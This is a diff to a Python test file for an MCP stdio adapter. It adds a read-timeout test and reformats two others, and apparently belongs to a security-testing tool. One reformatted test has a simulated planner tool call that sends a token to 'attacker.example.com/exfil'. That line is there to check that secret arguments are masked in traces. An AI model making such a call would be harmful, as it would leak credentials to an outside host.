@@ -285,6 +285,60 @@ async def test_open_mcp_session_does_not_inherit_the_full_parent_environment(
     assert "Path" not in captured_env
 
 
+@pytest.mark.asyncio
+async def test_open_mcp_session_passes_read_timeout_to_client_session() -> None:
+    """RB-DCR-0002 (stdio sibling): a spawned MCP server that hangs must not
+    block ``session.initialize()`` forever — ``ClientSession`` must be
+    constructed with a bounded ``read_timeout_seconds``, mirroring the fix
+    applied to the remote (SSE/HTTP) adapter's ``_open_remote_session``."""
+    import datetime as _dt
+
+    captured: dict[str, Any] = {}
+
+    class _FakeParams:
+        def __init__(self, *, command: str, args: list[str], env: dict[str, str]) -> None:
+            pass
+
+    @asynccontextmanager
+    async def _fake_stdio_client(params: Any) -> Any:
+        yield (None, None)
+
+    class _FakeClientSession:
+        def __init__(self, *args: Any, **kwargs: Any) -> None:
+            captured["kwargs"] = kwargs
+            captured["args"] = args
+
+        async def __aenter__(self) -> _FakeClientSession:
+            return self
+
+        async def __aexit__(self, *exc: Any) -> None:
+            return None
+
+        async def initialize(self) -> None:
+            return None
+
+    with (
+        patch.object(stdio_adapter, "StdioServerParameters", _FakeParams),
+        patch.object(stdio_adapter, "stdio_client", _fake_stdio_client),
+        patch.object(stdio_adapter, "ClientSession", _FakeClientSession),
+    ):
+        from mylonite.plugins._mcp import target_registry
+
+        spec = target_registry.BUNDLED_TARGETS["fetch"]
+        async with stdio_adapter._open_mcp_session(spec, None):
+            pass
+
+    read_timeout = captured["kwargs"].get("read_timeout_seconds")
+    if read_timeout is None and captured["args"]:
+        read_timeout = captured["args"][0]
+    assert read_timeout is not None, (
+        "ClientSession must be given a bounded read_timeout_seconds so a "
+        "non-responding spawned server cannot hang initialize() forever"
+    )
+    assert isinstance(read_timeout, _dt.timedelta)
+    assert read_timeout.total_seconds() > 0
+
+
 # --- env-key casing must never produce a duplicate entry ---------------------
 
 
@@ -447,9 +501,7 @@ async def test_planner_trace_masks_secret_arg_but_keeps_url(tmp_path: Path) -> N
     async def planner_stub(**_: Any) -> SimpleNamespace:
         calls[0] += 1
         if calls[0] == 1:
-            args = json.dumps(
-                {"url": "http://attacker.example.com/exfil", "token": fake_token}
-            )
+            args = json.dumps({"url": "http://attacker.example.com/exfil", "token": fake_token})
             tc = SimpleNamespace(id="c1", function=SimpleNamespace(name="fetch", arguments=args))
             return SimpleNamespace(
                 choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=[tc]))]
@@ -1272,9 +1324,7 @@ async def test_attack_session_call_tool_is_timeout_bounded(tmp_path: Path) -> No
         yield _StuckSession()
 
     with patch.object(stdio_adapter, "_open_mcp_session", fake_open):
-        adapter = MCPStdioAdapter(
-            family="filesystem", scope=str(tmp_path), planner_timeout_s=0.1
-        )
+        adapter = MCPStdioAdapter(family="filesystem", scope=str(tmp_path), planner_timeout_s=0.1)
         session = await adapter.open_session()
         try:
             with pytest.raises(TimeoutError):
